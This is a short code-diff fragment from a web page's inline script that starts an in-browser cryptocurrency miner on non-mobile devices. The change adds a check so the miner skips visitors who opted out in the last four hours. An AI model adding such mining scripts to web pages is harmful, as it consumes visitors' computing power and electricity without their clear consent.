@@ -226,7 +226,7 @@ exp特性可以用于数据查询和数据更新。s">
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile()) {
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
 	}
 </script>  
